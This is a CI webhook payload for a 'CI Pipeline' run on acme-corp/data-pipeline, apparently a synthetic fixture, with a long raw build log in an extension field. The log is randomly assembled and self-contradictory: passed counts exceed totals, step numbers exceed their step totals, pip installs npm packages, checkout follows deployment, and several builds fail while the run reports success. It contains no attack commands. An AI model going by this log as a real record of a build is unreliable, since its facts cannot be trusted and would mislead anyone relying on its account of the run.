{
  "action": "completed",
  "workflow_run": {
    "id": 437,
    "name": "CI Pipeline",
    "head_branch": "main",
    "head_sha": "15df5dda89a82da6bfb40eab45b2f51404f644a7",
    "status": "completed",
    "conclusion": "success",
    "run_started_at": "2025-11-22T12:46:47.357831Z",
    "updated_at": "2025-11-22T12:48:24.598677Z"
  },
  "repository": {
    "full_name": "acme-corp/data-pipeline",
    "name": "data-pipeline"
  },
  "sender": {
    "login": "eve"
  },
  "_safeops_extended": {
    "raw_logs": "=== Step: install_dependencies ===\nOptimizing 43 modules...\nTransforming 926 files...\nLoading...\n[12:46:47] DEBUG: Loading configuration\nPushing to registry...\nStep 5/24: Running migrations\nBundling runtime.css\n\u2713 package completed\nTransforming 497 files...\nPlatform: linux-x64\nTLS handshake completed\nCompiling lib/utils.go...\nMinifying main.js\nNODE_ENV=development\nStep 15/21: Deploying\nBundling runtime.css\nCache restored successfully (303MB)\nLoading...\n\u2713 build completed\nUploading artifact 'coverage' (47 files)\nnpm install: resolved 1945 packages\nCompiling utils/service.java...\n\u2713 All checks passed\nConnection established\nStep 14/25: Linting\nArtifact downloaded: 4MB\nTLS handshake completed\nTransforming 151 files...\nImage pulled successfully\nCompiling src/main.py...\nStep 4/23: Installing dependencies\n\u2713 Task completed in 4912ms\nImage pulled successfully\nTransforming 725 files...\nArtifact uploaded: build.tar.gz (49MB)\nReady.\nUploading artifact 'coverage' (17 files)\nyarn add: Done in 18.38s\nArtifact downloaded: 43MB\n[12:46:47] DEBUG: Initializing service\nProcessing...\nProcessing...\nSnapshots: 35 passed, 11 total\nCache hit for key-1529\n[12:46:47] INFO: Request completed\n[12:46:47] INFO: Processing request\nCoverage: 76% statements, 97% branches\nAlready up to date.\nWARNING: eslint has known vulnerabilities\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n[12:46:47] INFO: Processing request\nPushing to registry...\nTest Suites: 9 passed, 16 total\n[12:46:47] DEBUG: Initializing service\nTests: 243 passed, 161 total\nTime: 18.191s\n[12:46:47] WARN: Deprecated API usage\nWARNING: webpack has known vulnerabilities\nPushing to registry...\nFAILED: test_cache_hit\nDone.\nStep 2/25: Testing\n[12:46:47] INFO: Connecting to database\nFetching from https://github.com/package.json\nUploading artifact 'build' (45 files)\nCache invalidated: build\nTLS handshake completed\nStep 15/15: Building\nFinished.\nLoading...\nImage pulled successfully\nAlready up to date.\nReady.\npip: Installing build dependencies...\nCompiling lib/app.ts...\nCoverage: 80% statements, 97% branches\nException: ValueError\nException: RuntimeError\nAlready up to date.\nCache hit for key-8945\nStep 8/25: Running migrations\nBundling runtime.js\nEnvironment: production\nOptimizing 37 modules...\nTransforming 938 files...\nUploading artifact 'build' (8 files)\nVerifying...\nGenerating source maps...\nException: TypeError\nPushing to registry...\n[12:46:47] INFO: Request completed\nFinished.\nTLS handshake completed\n\u2713 lint completed\nPlatform: linux-x64\nPulling image: alpine:latest\nAlready up to date.\nTLS handshake completed\nDone.\nInstalling eslint@3.19.0\nCache miss for key-4308\n[12:46:47] WARN: Deprecated API usage\nGET /health - 201 (3ms)\n=== Step install_dependencies completed ===\n=== Step: lint ===\nVerifying...\nWARNING: express has known vulnerabilities\nTest Suites: 28 passed, 14 total\nyarn add: Done in 7.46s\npip: Installing build dependencies...\nTest Suites: 5 passed, 20 total\n[12:46:47] INFO: Cache refreshed\nTime: 10.7s\nStep 13/17: Running migrations\n[12:46:47] INFO: Cache refreshed\nRan 50 tests in 31s\nDone.\nyarn add: Done in 12.66s\npip: Downloading axios-3.18.tar.gz\n\u2713 Step 'build' succeeded\nReady.\n[12:46:47] DEBUG: Connection pool: 3 active\n\u2713 test completed\nTransforming 499 files...\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nCreating production build...\nFAILED: test_user_create\npip install: Successfully installed jest-1.4\nTests: 258 passed, 80 total\nAlready up to date.\n[12:46:47] DEBUG: Initializing service\nRan 28 tests in 27s\nTime: 96.909s\nnpm notice: package.json updated\nDone.\n[12:46:47] DEBUG: Connection pool: 9 active\nOptimizing 68 modules...\n[12:46:47] INFO: Starting build process\nUsing Node.js 18.17.10\nnpm install: added 496 packages\nStep 13/20: Testing\nStep 2/15: Testing\nStep 8/15: Linting\npip: Installing build dependencies...\nStep 13/23: Linting\n\u2713 Task completed in 2375ms\nGenerating source maps...\n[12:46:47] INFO: Request completed\nCompiling src/handler.rs...\n[12:46:47] WARN: Deprecated API usage\nConnection established\nStep 11/21: Building\nReady.\n[12:46:47] DEBUG: Loading configuration\nStep 15/22: Linting\nTime: 87.771s\nProcessing...\nSwitched to branch 'bugfix/task-781'\n[12:46:47] DEBUG: Query executed in 24ms\n[12:46:47] DEBUG: Query executed in 16ms\n[12:46:47] DEBUG: Connection pool: 2 active\nnpm install: added 124 packages\nTime: 50.611s\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nTest Suites: 45 passed, 5 total\nStep 16/23: Linting\nMinifying app.js\nChecking out develop branch\nCache invalidated: build\n[12:46:47] WARN: Deprecated API usage\nLayer 1/13: RUN command\nPushing to registry...\npip: Downloading jest-5.1.tar.gz\nMinifying main.js\n\u2717 build failed with exit code 50\nException: NullPointerException\nCache saved successfully\n[12:46:47] DEBUG: Connection pool: 14 active\nReady.\nArtifact uploaded: dist.zip (26MB)\nCreating production build...\nHEAD is now at e046949\nSnapshots: 30 passed, 34 total\nTLS handshake completed\n[12:46:47] DEBUG: Initializing service\n[12:46:47] INFO: Request completed\nTransforming 216 files...\n[12:46:47] INFO: Cache refreshed\nnpm install: added 79 packages\nProcessing...\nUsing Python 3.12\nEnvironment: development\nTest Suites: 17 passed, 23 total\nVerifying...\nStep 5/19: Testing\nGenerating source maps...\nCache restored successfully (315MB)\nWARNING: express has known vulnerabilities\n[12:46:47] INFO: Connecting to database\nnpm install: resolved 1816 packages\nTransforming 770 files...\nCache hit for key-4035\n\u2713 build completed\nTLS handshake completed\nnpm notice: package.json updated\nGET /health - 200 (71ms)\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nGET /health - 204 (75ms)\n=== Step lint completed ===\n=== Step: deploy_production ===\n[12:46:47] INFO: Request completed\n[12:46:47] DEBUG: Memory usage: 1066MB\nPlatform: linux-x64\nSnapshots: 35 passed, 32 total\n[12:46:47] DEBUG: Connection pool: 15 active\nStep 7/19: Deploying\nStep 8/25: Building\npip install: Successfully installed lodash-4.6\npip: Installing build dependencies...\nCache miss for key-7172\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nCoverage: 79% statements, 65% branches\nStep 4/22: Building\nFetching submodules...\n[12:46:47] DEBUG: Memory usage: 244MB\nUploading artifact 'dist' (28 files)\nConnection established\nGET /status - 200 (87ms)\nCreating production build...\nStep 8/24: Deploying\npip install: Successfully installed jest-3.8\nHEAD is now at aa60965\nCache restored successfully (41MB)\nBuilding Docker image...\n[12:46:47] INFO: Cache refreshed\nTime: 43.504s\npip install: Successfully installed prettier-3.14\nArtifact uploaded: build.tar.gz (37MB)\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nGenerating source maps...\n[12:46:47] WARN: Deprecated API usage\nTLS handshake completed\n  PASS: test_auth_login (369ms)\n[12:46:47] DEBUG: Initializing service\n[12:46:47] DEBUG: Connection pool: 18 active\nTLS handshake completed\nCompiling lib/handler.rs...\n[12:46:47] INFO: Processing request\n[12:46:47] INFO: Processing request\nCompiling src/handler.rs...\nWARNING: lodash has known vulnerabilities\nCreating production build...\n\u2713 All checks passed\n  PASS: test_api_health (252ms)\nCache invalidated: node_modules\nCompiling utils/handler.rs...\nDone.\nArtifact uploaded: dist.zip (53MB)\n[12:46:47] DEBUG: Query executed in 44ms\nSnapshots: 2 passed, 17 total\nReady.\nAlready up to date.\nImage pulled successfully\nConnection established\n[12:46:47] DEBUG: Initializing service\nCache saved successfully\nCompiling utils/utils.go...\nArtifact uploaded: dist.zip (5MB)\n[12:46:47] INFO: Starting build process\nFinished.\nLoading...\n\u2717 build failed with exit code 23\n[12:46:47] INFO: Cache refreshed\nInstalling jest@4.8.10\nDone.\nnpm install: resolved 1051 packages\nCache restored successfully (57MB)\nCompiling components/handler.rs...\nUsing Node.js 14.12.7\n\u2713 Step 'checkout' succeeded\n[12:46:47] DEBUG: Query executed in 65ms\nPulling image: alpine:3.11\nUsing Node.js 20.7.10\npip: Collecting lodash\n[12:46:47] DEBUG: Query executed in 21ms\nArtifact uploaded: build.tar.gz (16MB)\nCompiling lib/service.java...\npip: Downloading react-5.2.tar.gz\nException: NullPointerException\nArtifact uploaded: build.tar.gz (33MB)\nCompiling utils/handler.rs...\n  PASS: e2e/test_api_health.spec.js\nCache saved successfully\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n[12:46:47] ERROR: Connection failed\nSwitched to branch 'feature/task-692'\nnpm install: resolved 623 packages\nEnvironment: staging\n[12:46:47] DEBUG: Loading configuration\n[12:46:47] INFO: Connecting to database\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nLayer 10/15: ENV command\n[12:46:47] INFO: Processing request\nFetching submodules...\nCache saved successfully\n\u2713 Step 'checkout' succeeded\nnpm notice: created a lockfile\nPlatform: linux-x64\nVerifying...\nBundling vendor.js\nCache miss for key-5585\nUploading artifact 'dist' (32 files)\nCreating production build...\n=== Step deploy_production completed ===\n=== Step: e2e_tests ===\n[12:46:47] ERROR: Connection failed\n\u2717 build failed with exit code 20\nInstalling prettier@2.10.2\nCompiling src/main.py...\nnpm notice: package.json updated\n\u2713 Task completed in 4134ms\nCompleted.\nnpm install: added 49 packages\nSnapshots: 9 passed, 33 total\nLayer 2/15: ENV command\nBundling main.css\nSwitched to branch 'bugfix/task-358'\nCache saved successfully\nArtifact downloaded: 48MB\n[12:46:47] INFO: Connecting to database\nUsing Python 3.10\nCompiling src/index.js...\nSuccess!\nMinifying vendor.js\nTest Suites: 38 passed, 12 total\nCompiling components/handler.rs...\npip: Installing build dependencies...\nnpm install: resolved 1158 packages\n[12:46:47] DEBUG: Query executed in 50ms\nStep 9/16: Testing\nTransforming 991 files...\nPlatform: darwin-arm64\nCache saved successfully\n[12:46:47] WARN: Deprecated API usage\nStep 2/20: Linting\nStep 15/15: Building\n[12:46:47] DEBUG: Query executed in 70ms\nImage pulled successfully\nCompiling lib/index.js...\nBundling styles.js\nStep 6/18: Deploying\nTime: 108.688s\n  PASS: test_user_create (332ms)\nFetching submodules...\n[12:46:47] INFO: Starting build process\nnpm install: resolved 1416 packages\npip install: Successfully installed jest-5.0\nFetching submodules...\nPlatform: linux-x64\nTime: 111.615s\nWARNING: eslint has known vulnerabilities\n[12:46:47] WARN: Deprecated API usage\nCache restored successfully (179MB)\nStep 18/15: Building\nTime: 72.550s\n\u2717 build failed with exit code 79\nUsing Node.js 18.16.1\n  PASS: test_user_create (364ms)\npip: Installing build dependencies...\n  PASS: test_cache_hit (457ms)\nWARNING: eslint has known vulnerabilities\n[12:46:47] DEBUG: Connection pool: 19 active\n  PASS: e2e/test_auth_login.spec.js\n[12:46:47] INFO: Processing request\nConnection established\nPulling image: python:latest\n[12:46:47] DEBUG: Initializing service\nStep 7/15: Building\nStep 20/23: Deploying\nCreating production build...\n[12:46:47] DEBUG: Memory usage: 1115MB\nTests: 272 passed, 427 total\n  PASS: integration/test_db_connect.spec.js\nOK\nCompiling src/service.java...\nInstalling webpack@3.15.4\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nVerifying...\npip: Downloading eslint-1.0.tar.gz\nCompleted.\nPOST /upload - 201 (306ms)\nWaiting...\nOptimizing 79 modules...\n[12:46:47] INFO: Starting build process\nCache invalidated: build\nStep 16/21: Building\n\u2717 build failed with exit code 94\nCache invalidated: dependencies\nCache miss for key-9086\nLayer 5/14: ENV command\nEnvironment: production\nnpm install: resolved 1710 packages\nCache saved successfully\nStep 19/20: Running migrations\n[12:46:47] WARN: Deprecated API usage\nReady.\nCompiling components/handler.rs...\nGET /status - 200 (59ms)\nCache invalidated: node_modules\nFetching submodules...\nGenerating source maps...\nPlatform: win32-x64\n\u2713 Task completed in 2217ms\nArtifact uploaded: dist.zip (58MB)\nFetching submodules...\nStep 15/16: Running migrations\nArtifact uploaded: build.tar.gz (45MB)\npip: Collecting webpack\n=== Step e2e_tests completed ===\n=== Step: restore_cache ===\nLoading...\nArtifact uploaded: dist.zip (53MB)\nTLS handshake completed\nHEAD is now at 5967e89\nSwitched to branch 'hotfix/task-802'\npip: Downloading webpack-3.10.tar.gz\nSuccess!\nStep 1/23: Testing\n[12:46:47] DEBUG: Query executed in 53ms\nArtifact uploaded: build.tar.gz (43MB)\n[12:46:47] DEBUG: Connection pool: 19 active\nException: RuntimeError\nCompiling components/handler.rs...\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nnpm install: resolved 435 packages\npip install: Successfully installed jest-1.11\nVerifying...\nCache miss for key-6600\nLayer 9/14: RUN command\nStep 13/23: Running migrations\npip: Installing build dependencies...\nCache restored successfully (70MB)\nTLS handshake completed\nRan 42 tests in 14s\nPushing to registry...\nImage pulled successfully\nStep 18/17: Running migrations\nCache miss for key-9443\nArtifact uploaded: dist.zip (15MB)\nConnection established\nCache invalidated: build\n[12:46:47] DEBUG: Query executed in 30ms\nnpm install: added 477 packages\n\u2713 validate completed\nRan 129 tests in 55s\nTests: 85 passed, 292 total\nCache restored successfully (396MB)\nUsing Python 3.11\nTest Suites: 33 passed, 14 total\n[12:46:47] INFO: Starting build process\nLayer 1/13: COPY command\nArtifact uploaded: dist.zip (95MB)\nnpm notice: created a lockfile\nGenerating source maps...\nArtifact uploaded: build.tar.gz (48MB)\nDone.\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nEnvironment: production\nCache restored successfully (346MB)\nStep 8/17: Building\n[12:46:47] DEBUG: Connection pool: 14 active\npip: Downloading jest-5.11.tar.gz\npip: Collecting react\nArtifact uploaded: build.tar.gz (2MB)\n  PASS: e2e/test_auth_login.spec.js\nTime: 48.507s\nReady.\n  PASS: unit/test_api_health.spec.js\nConnection established\nSuccess!\nCache miss for key-8676\nCompiling components/app.ts...\npip install: Successfully installed lodash-1.18\n[12:46:47] ERROR: Connection failed\nArtifact downloaded: 45MB\nCoverage: 77% statements, 80% branches\n[12:46:47] DEBUG: Memory usage: 1004MB\nVerifying...\nnpm notice: created a lockfile\nStep 8/18: Deploying\nCache invalidated: dependencies\nWaiting...\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nGenerating source maps...\n\u2713 Step 'checkout' succeeded\n  PASS: integration/test_db_connect.spec.js\n[12:46:47] INFO: Cache refreshed\nFetching submodules...\nStep 18/17: Installing dependencies\nProcessing...\nSwitched to branch 'feature/task-965'\nBundling styles.js\n[12:46:47] INFO: Request completed\n\u2713 All checks passed\nBundling vendor.css\nStep 20/21: Installing dependencies\nGET /health - 201 (34ms)\nException: TypeError\nTest Suites: 43 passed, 49 total\n[12:46:47] INFO: Starting build process\n  PASS: test_user_create (216ms)\npip: Installing build dependencies...\nUsing Python 3.12\nFetching submodules...\nConnection established\nCompiling src/app.ts...\n\u2713 Task completed in 341ms\nStep 7/19: Building\nStep 10/25: Installing dependencies\nStep 11/17: Running migrations\n\u2713 lint completed\nCache saved successfully\n[12:46:47] DEBUG: Memory usage: 518MB\n=== Step restore_cache completed ===\n=== Step: checkout ===\nSuccess!\nPushing to registry...\nSnapshots: 27 passed, 14 total\nStep 3/16: Running migrations\nWARNING: eslint has known vulnerabilities\n[12:46:47] DEBUG: Connection pool: 1 active\n  PASS: unit/test_auth_login.spec.js\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nyarn add: Done in 23.98s\npip: Collecting prettier\nStep 5/18: Running migrations\nnpm notice: created a lockfile\nUploading artifact 'coverage' (42 files)\nRan 92 tests in 51s\n\u2713 Step 'checkout' succeeded\nBuilding Docker image...\nTime: 63.708s\nTime: 58.166s\nStep 2/18: Installing dependencies\nyarn add: Done in 25.88s\nVerifying...\nBuilding Docker image...\n  PASS: unit/test_db_connect.spec.js\nTests: 142 passed, 329 total\nFetching submodules...\n[12:46:47] INFO: Starting build process\nMinifying vendor.js\nnpm install: resolved 1535 packages\nBundling styles.js\nInstalling express@1.10.9\nFinished.\nConnection established\nGenerating source maps...\n\u2717 build failed with exit code 32\nOptimizing 39 modules...\npip install: Successfully installed eslint-4.5\nCompiling lib/app.ts...\nWARNING: jest has known vulnerabilities\nMinifying app.js\nFAILED: test_user_create\nTLS handshake completed\nFAILED: test_user_create\nStep 9/23: Deploying\nWARNING: eslint has known vulnerabilities\nnpm install: resolved 925 packages\n\u2713 All checks passed\nNODE_ENV=test\nCompiling lib/app.ts...\nNODE_ENV=production\nRan 55 tests in 57s\nCache saved successfully\n[12:46:47] ERROR: Connection failed\nTLS handshake completed\n[12:46:47] DEBUG: Memory usage: 443MB\n[12:46:47] INFO: Request completed\nPushing to registry...\nException: TypeError\n[12:46:47] DEBUG: Query executed in 25ms\n[12:46:47] INFO: Request completed\nEnvironment: test\nProcessing...\nCompiling components/index.js...\npip: Downloading prettier-2.0.tar.gz\nTLS handshake completed\n[12:46:47] INFO: Request completed\n[12:46:47] DEBUG: Loading configuration\nArtifact uploaded: dist.zip (17MB)\nTime: 47.528s\nArtifact uploaded: build.tar.gz (48MB)\nSuccess!\nnpm install: resolved 1178 packages\nVerifying...\nFetching submodules...\nPushing to registry...\n\u2713 lint completed\nFetching submodules...\nFAILED: test_db_connect\nHEAD is now at 125db21\nCompiling utils/handler.rs...\n\u2713 Task completed in 4560ms\n[12:46:47] INFO: Cache refreshed\n[12:46:47] WARN: Deprecated API usage\nnpm install: added 364 packages\n[12:46:47] DEBUG: Initializing service\nStep 18/25: Testing\nStep 12/23: Linting\nEnvironment: test\nChecking out master branch\nnpm install: resolved 1594 packages\nTests: 438 passed, 113 total\nCache saved successfully\nCompiling lib/index.js...\nCompleted.\nArtifact downloaded: 2MB\nFetching submodules...\npip: Collecting lodash\nSuccess!\nWARNING: eslint has known vulnerabilities\npip: Downloading lodash-1.10.tar.gz\n  PASS: unit/test_db_connect.spec.js\nUploading artifact 'coverage' (44 files)\npip: Downloading express-3.7.tar.gz\nStep 2/23: Building\n=== Step checkout completed ===\n=== Step: build ===\nFetching from https://githubusercontent.com/package.json\nFetching submodules...\nCoverage: 87% statements, 63% branches\nGenerating source maps...\nNODE_ENV=development\nCache hit for key-3924\n\u2717 build failed with exit code 125\nAlready up to date.\nStep 11/15: Testing\nPOST /api - 200 (347ms)\nFAILED: test_api_health\nnpm notice: package.json updated\nArtifact uploaded: dist.zip (48MB)\nCompiling components/utils.go...\nWaiting...\nStep 3/22: Building\nTLS handshake completed\nnpm notice: package.json updated\nStep 3/15: Deploying\nLoading...\nUsing Python 3.10\nDone.\nWaiting...\n[12:46:47] INFO: Connecting to database\nnpm install: resolved 144 packages\nnpm install: added 142 packages\nCache restored successfully (310MB)\n[12:46:47] DEBUG: Query executed in 100ms\n[12:46:47] DEBUG: Connection pool: 8 active\n\u2713 Step 'test' succeeded\n[12:46:47] DEBUG: Memory usage: 209MB\nTest Suites: 17 passed, 25 total\nCache invalidated: node_modules\nCache invalidated: build\nInstalling react@4.2.5\nStep 15/24: Building\n  PASS: test_db_connect (219ms)\nChecking out main branch\nnpm notice: package.json updated\nArtifact uploaded: build.tar.gz (48MB)\nException: ValueError\npip: Downloading lodash-5.14.tar.gz\nTests: 54 passed, 61 total\nUsing Python 3.11\n[12:46:47] INFO: Starting build process\nCompiling lib/index.js...\n[12:46:47] DEBUG: Memory usage: 1693MB\n\u2713 package completed\nWARNING: axios has known vulnerabilities\nChecking out master branch\nCreating production build...\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n[12:46:47] WARN: Deprecated API usage\nLayer 1/9: COPY command\n[12:46:47] INFO: Connecting to database\n[12:46:47] INFO: Request completed\nOptimizing 37 modules...\nCompiling components/utils.go...\n\u2713 deploy completed\nGET /health - 204 (39ms)\nSnapshots: 17 passed, 31 total\nFetching from https://registry.npmjs.org/package.json\nArtifact downloaded: 13MB\nRan 59 tests in 26s\nCompiling src/service.java...\nUsing Python 3.10\nBuilding Docker image...\nTLS handshake completed\nCompiling utils/utils.go...\nImage pulled successfully\nTransforming 762 files...\nnpm notice: package.json updated\nCache restored successfully (180MB)\n[12:46:47] DEBUG: Loading configuration\nWARNING: webpack has known vulnerabilities\nSwitched to branch 'bugfix/task-586'\nnpm notice: package.json updated\nArtifact uploaded: build.tar.gz (31MB)\nnpm notice: created a lockfile\n\u2713 Step 'setup' succeeded\nConnection established\n[12:46:47] INFO: Cache refreshed\n[12:46:47] WARN: Deprecated API usage\nReady.\nTime: 69.694s\nStep 9/16: Linting\nTime: 103.938s\nTLS handshake completed\nCompiling components/utils.go...\nEnvironment: development\nGenerating source maps...\nConnection established\nUsing Python 3.11\nStep 9/19: Linting\nWARNING: axios has known vulnerabilities\nStep 20/21: Installing dependencies\n[12:46:47] ERROR: Connection failed\nVerifying...\nBuilding Docker image...\n\u2713 Step 'test' succeeded\npip: Downloading prettier-5.20.tar.gz\nArtifact uploaded: dist.zip (23MB)\nSwitched to branch 'feature/task-230'\n=== Step build completed ===\n=== Step: upload_artifacts ===\nTransforming 999 files...\n\u2713 All checks passed\nHEAD is now at 3ffd8a5\nSwitched to branch 'feature/task-853'\nStep 18/18: Building\n[12:46:47] INFO: Starting build process\nStep 16/21: Deploying\nCache invalidated: build\nBuilding Docker image...\npip: Installing build dependencies...\nLoading...\nSuccess!\nPlatform: win32-x64\nWARNING: jest has known vulnerabilities\nTests: 497 passed, 147 total\n[12:46:47] INFO: Cache refreshed\nGET /api - 200 (97ms)\nEnvironment: test\nOK\n[12:46:47] DEBUG: Initializing service\n[12:46:47] DEBUG: Initializing service\nInstalling express@4.8.6\n[12:46:47] ERROR: Connection failed\n[12:46:47] WARN: Deprecated API usage\nStep 3/21: Linting\nLoading...\nCache miss for key-6944\nArtifact uploaded: dist.zip (92MB)\nCache hit for key-4526\nUploading artifact 'build' (28 files)\nUsing Python 3.9\nStep 20/23: Running migrations\nConnection established\nCompleted.\nStep 1/25: Deploying\npip: Downloading axios-1.14.tar.gz\nCache invalidated: dependencies\n[12:46:47] DEBUG: Connection pool: 6 active\n[12:46:47] INFO: Connecting to database\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nConnection established\n[12:46:47] INFO: Request completed\nSnapshots: 33 passed, 34 total\nTransforming 171 files...\nPushing to registry...\nTest Suites: 41 passed, 10 total\n[12:46:47] DEBUG: Query executed in 70ms\nSwitched to branch 'bugfix/task-700'\n[12:46:47] DEBUG: Memory usage: 1742MB\n[12:46:47] INFO: Starting build process\nTest Suites: 27 passed, 5 total\nBuilding Docker image...\nFetching from https://pypi.org/package.json\nTest Suites: 38 passed, 16 total\nImage pulled successfully\nCache invalidated: build\n[12:46:47] DEBUG: Query executed in 90ms\nGenerating source maps...\nBundling runtime.js\nCompiling utils/main.py...\nCompiling utils/index.js...\nUsing Python 3.11\nCompiling components/index.js...\npip install: Successfully installed express-4.15\n[12:46:47] DEBUG: Loading configuration\nFetching submodules...\nStep 10/24: Testing\nCompiling utils/service.java...\nnpm notice: created a lockfile\nFinished.\nPlatform: linux-x64\nConnection established\n[12:46:47] DEBUG: Connection pool: 4 active\nnpm notice: package.json updated\n\u2713 Step 'test' succeeded\nStep 2/21: Installing dependencies\nFetching from https://docker.io/package.json\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nArtifact uploaded: build.tar.gz (35MB)\nFetching submodules...\nStep 7/20: Installing dependencies\n[12:46:47] DEBUG: Memory usage: 1797MB\n[12:46:47] INFO: Request completed\n[12:46:47] INFO: Request completed\nUsing Python 3.9\nCompleted.\nAlready up to date.\n\u2717 build failed with exit code 12\nCompiling utils/index.js...\nPOST /api - 201 (102ms)\nCompiling utils/handler.rs...\n[12:46:47] INFO: Connecting to database\n\u2713 build completed\nNODE_ENV=test\nTest Suites: 22 passed, 16 total\nCache hit for key-3104\nPlatform: win32-x64\n[12:46:47] DEBUG: Loading configuration\nNODE_ENV=production\nPulling image: node:18\nTLS handshake completed\n[12:46:47] INFO: Starting build process\nUploading artifact 'build' (35 files)\n=== Step upload_artifacts completed ===\n=== Step: setup_environment ===\n[12:46:47] DEBUG: Initializing service\nFetching from https://googleapis.com/package.json\nWaiting...\nCompiling utils/main.py...\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nTransforming 167 files...\nConnection established\nCache saved successfully\nAlready up to date.\n  PASS: test_cache_hit (111ms)\nImage pulled successfully\nArtifact uploaded: build.tar.gz (25MB)\nStep 10/18: Building\nFetching from https://gcr.io/package.json\nNODE_ENV=test\nRan 10 tests in 57s\nOptimizing 16 modules...\npip: Downloading webpack-1.2.tar.gz\nBuilding Docker image...\nCompiling components/index.js...\nException: TypeError\n[12:46:47] DEBUG: Initializing service\n[12:46:47] DEBUG: Initializing service\n[12:46:47] DEBUG: Connection pool: 5 active\nStep 3/15: Testing\nWARNING: express has known vulnerabilities\n[12:46:47] DEBUG: Query executed in 39ms\nInstalling express@4.19.8\n[12:46:47] DEBUG: Initializing service\nCreating production build...\nDone.\nFAILED: test_auth_login\nBuilding Docker image...\nCompiling utils/service.java...\nCache restored successfully (128MB)\n\u2713 All checks passed\nGenerating source maps...\nWARNING: eslint has known vulnerabilities\nUploading artifact 'dist' (32 files)\nCreating production build...\n[12:46:47] INFO: Connecting to database\n[12:46:47] DEBUG: Query executed in 33ms\nTime: 10.190s\nProcessing...\n\u2713 All checks passed\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nCache invalidated: node_modules\nCompiling components/index.js...\nProcessing...\nCompiling lib/main.py...\n[12:46:47] DEBUG: Memory usage: 729MB\nGET /api - 201 (34ms)\n\u2713 All checks passed\n[12:46:47] INFO: Request completed\nHEAD is now at b18054f\nConnection established\nChecking out master branch\nCompleted.\n[12:46:47] DEBUG: Connection pool: 19 active\nLoading...\n[12:46:47] INFO: Request completed\nGenerating source maps...\n[12:46:47] INFO: Connecting to database\n[12:46:47] DEBUG: Memory usage: 701MB\nFetching submodules...\nArtifact downloaded: 39MB\nLoading...\n[12:46:47] WARN: Deprecated API usage\nPulling image: python:latest\nCoverage: 99% statements, 70% branches\nnpm notice: created a lockfile\nCompiling utils/app.ts...\nTime: 107.462s\n[12:46:47] DEBUG: Connection pool: 2 active\nChecking out main branch\nDone.\nInstalling eslint@4.7.7\nTime: 82.80s\nnpm notice: package.json updated\n[12:46:47] INFO: Processing request\nOptimizing 45 modules...\nBundling styles.js\nSwitched to branch 'hotfix/task-117'\nnpm install: resolved 380 packages\nProcessing...\nArtifact downloaded: 35MB\nDone.\nProcessing...\npip install: Successfully installed lodash-2.14\nChecking out main branch\nCache hit for key-5451\n  PASS: unit/test_cache_hit.spec.js\nPushing to registry...\nSwitched to branch 'bugfix/task-658'\nSwitched to branch 'hotfix/task-496'\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nCache restored successfully (58MB)\nnpm notice: package.json updated\nArtifact downloaded: 33MB\nBundling main.js\nProcessing...\n  PASS: integration/test_db_connect.spec.js\nTLS handshake completed\n=== Step setup_environment completed ===\n=== Step: unit_tests ===\nOptimizing 74 modules...\n\u2713 build completed\nEnvironment: test\n[12:46:47] WARN: Deprecated API usage\n[12:46:47] DEBUG: Initializing service\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nTests: 384 passed, 87 total\nOK\nBuilding Docker image...\nWARNING: react has known vulnerabilities\n[12:46:47] WARN: Deprecated API usage\nMinifying main.js\n[12:46:47] INFO: Cache refreshed\nRan 78 tests in 13s\nFinished.\nCache restored successfully (383MB)\nDone.\nTransforming 902 files...\nPulling image: node:latest\nGET /api - 200 (20ms)\nyarn add: Done in 19.16s\n[12:46:47] DEBUG: Connection pool: 14 active\nCache hit for key-9198\n[12:46:47] INFO: Processing request\nMinifying app.js\nMinifying app.js\n\u2713 Step 'install' succeeded\nUploading artifact 'coverage' (27 files)\n[12:46:47] DEBUG: Memory usage: 907MB\nStep 7/20: Testing\nRan 34 tests in 40s\nRan 31 tests in 58s\nCache miss for key-6201\nCache hit for key-7490\nFetching from https://docker.io/package.json\nnpm install: resolved 1783 packages\n\u2713 Task completed in 2594ms\nNODE_ENV=development\nCache hit for key-2303\nSuccess!\nCompiling src/utils.go...\nHEAD is now at 3deae84\n[12:46:47] ERROR: Connection failed\nLayer 3/14: COPY command\n  PASS: unit/test_db_connect.spec.js\n[12:46:47] WARN: Deprecated API usage\n\u2713 Step 'install' succeeded\nBundling styles.css\npip: Collecting axios\nCache restored successfully (58MB)\n\u2713 All checks passed\nBuilding Docker image...\nPulling image: node:18\nBundling runtime.css\n[12:46:47] INFO: Starting build process\nnpm notice: package.json updated\nCache hit for key-3067\n\u2717 build failed with exit code 124\nChecking out main branch\nInstalling eslint@4.16.7\nReady.\nStep 9/24: Testing\nCompiling utils/main.py...\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n  PASS: unit/test_user_create.spec.js\nCache invalidated: build\nLayer 3/10: ENV command\nCache restored successfully (138MB)\nWARNING: react has known vulnerabilities\n[12:46:47] DEBUG: Query executed in 91ms\nHEAD is now at b73c570\nException: TypeError\nCompiling lib/handler.rs...\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n[12:46:47] ERROR: Connection failed\nnpm notice: package.json updated\nNODE_ENV=test\nWARNING: webpack has known vulnerabilities\nUsing Node.js 18.7.3\nDone.\nStep 4/15: Linting\n\u2713 All checks passed\nCache hit for key-3244\nFinished.\nStep 20/17: Building\nStep 14/16: Linting\nCoverage: 84% statements, 93% branches\nWARNING: prettier has known vulnerabilities\nPlatform: darwin-arm64\nCompiling utils/service.java...\nBuilding Docker image...\nCompiling components/app.ts...\nFinished.\nnpm notice: created a lockfile\n[12:46:47] INFO: Cache refreshed\nSuccess!\nChecking out master branch\nImage pulled 